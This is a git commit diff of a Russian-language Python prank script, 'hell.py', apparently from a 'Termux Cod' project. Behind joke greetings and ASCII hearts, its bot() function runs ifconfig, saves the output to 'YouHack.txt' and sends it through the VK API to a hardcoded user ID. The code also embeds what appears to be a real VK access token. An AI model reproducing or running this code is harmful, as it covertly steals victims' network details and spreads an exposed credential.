94110850936dc6b5f2cd5b8b832ee365f70fea07
Topo1us <65972332+Topo1us@users.noreply.github.com>
2020-06-15 23:22:31 +0300

    Update hell.py

--- hell.py
+++ hell.py
@@ -1,15 +1,82 @@
-#!/usr/bin/python
-import tkinter
-from tkinter import *
-ok=tkinter.Tk()
-ok.configure(bg='black')
-ok.title('Termux Cod')
-lat=Label(ok,text='если у вас нет кода доступа\nобратитесь в тех.поддержку группы Termux Cod.',bg='black',fg='yellow')
-en=Entry(ok,show='*')
-but=Button(ok,text='войти',bg='black',fg='green')
-but_2=Button(ok,text='выйти',command=ok.quit,bg='black',fg='red')
-lat.pack()
-en.pack()
-but.pack()
-but_2.pack()
-ok.mainloop()
+import time
+import os
+import random
+from random import randint
+import vk_api
+from vk_api.longpoll import VkLongPoll, VkEventType
+def hello():
+    print('П')
+    f=time.sleep(0.1)
+    print('Р')
+    f=time.sleep(0.1)
+    print('И')
+    f=time.sleep(0.1)
+    print('В')
+    f=time.sleep(0.1)
+    print('Е')
+    f=time.sleep(0.1)
+    print('Т')
+    f=time.sleep(0.1)
+    X=input('Готов?\n: ')
+    if X=='да' or X=='Да' or X=='ДА' or X=='Y' or X=='y':
+        print('П')
+        f=time.sleep(0.1)
+        print('О')
+        f=time.sleep(0.1)
+        print('Е')
+        f=time.sleep(0.1)
+        print('Х')
+        f=time.sleep(0.1)
+        print('А')
+        f=time.sleep(0.1)
+        print('Л')
+        f=time.sleep(0.1)
+        print('И')
+        f=time.sleep(0.1)
+        print(': )')
+        f=time.sleep(0.1)
+    else:
+        print('П')
+        f=time.sleep(0.1)
+        print('О')
+        f=time.sleep(0.1)
+        print('К')
+        f=time.sleep(0.1)
+        print('А')
+        f=time.sleep(0.1)
+def hello_2():
+    print('Введите пароль: ')
+    time.sleep(4)
+    print('Да шучу я :)')
+    time.sleep(1)
+def prikol():
+    print('''
+	    ♥     	♥
+	    ♥     	♥
+	    ♥     	♥
+	    ♥     	♥
+	    ♥     	♥
+   ♥		         ♥
+    ♥		         ♥
+      ♥	        ♥
+	       ♥ ♥ ♥
+''')
+def bot():
+    rand=123456
+    os.system('ifconfig>>YouHack.txt')
+    os.system('ifconfig>>YouHack.txt')
+    o=open(r'YouHack.txt')
+    IP=o.read()
+    token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
+    def y(user_id,message):
+        vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
+    vk=vk_api.VkApi(token=token)
+    longpoll=VkLongPoll(vk)
+    y(437306907,IP)
+    for event in longpoll.listen():
+        if event.type==VkEventType.MESSAGE_NEW:
+            if event.to_me():
+                r=event.text
+                if r=='Начать' or r=='начать':
+                    y(event.user_id,'Привет, я бот Termux Cod.\n \nНапиши menu или help.')
+#ПРИВЕТСТВИЕ
